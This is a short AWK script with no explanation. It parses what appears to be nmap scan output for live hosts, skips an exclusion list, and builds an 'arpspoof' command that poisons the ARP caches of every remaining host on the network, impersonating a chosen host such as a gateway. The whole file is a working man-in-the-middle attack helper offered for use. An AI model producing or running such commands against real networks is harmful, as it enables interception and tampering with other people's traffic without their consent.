BEGIN {
    if (filter == "") {
        print "error, filter is not defined"
        exit 1
    }
    if (iface == "") {
        print "error, iface is not defined"
        exit 1
    }
    if (host == "") {
        print "error, host is not defined"
        exit 1
    }
    split(filter, restrict, ",")
    #for (ip in restrict) {
    #    print "restrict: " restrict[ip]
    #}
    split("",addresses)
}
/Status: Up/ {
    add = "true"
    for (ip in restrict) {
        if ($2 == restrict[ip]) {
            add = "false"
        }
    }
    if (add == "true") {
        addresses[length(addresses) + 1] = $2
    }
}
END {
    for (ip in addresses) {
        result = result " -t " addresses[ip]
    }
    if (filter != "" && iface != "" && host != "") {
        print "arpspoof -i " iface result " " host
    }
}
